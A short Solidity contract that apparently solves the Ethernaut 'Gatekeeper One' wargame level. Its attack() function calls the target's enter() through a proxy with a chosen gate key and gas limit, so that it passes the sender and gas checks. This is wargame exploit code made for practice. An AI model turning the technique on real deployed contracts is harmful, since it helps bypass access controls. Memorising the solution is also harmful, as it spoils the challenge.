pragma solidity ^0.8.4;

// import "hardhat/console.sol";

interface IGatekeeperOne {
    function enter(bytes8 _gateKey) external returns (bool);
}

contract GKOProxy{
    address targetAddr;

    constructor(address _targetAddr) {
        targetAddr = _targetAddr;
    }

    function attack(bytes8 _gateKey, uint256 _gasLimit) external payable {
        IGatekeeperOne target = IGatekeeperOne(targetAddr);
        bool retval = target.enter{gas: _gasLimit}(_gateKey);

        require(retval, "cannot enter");
    }
}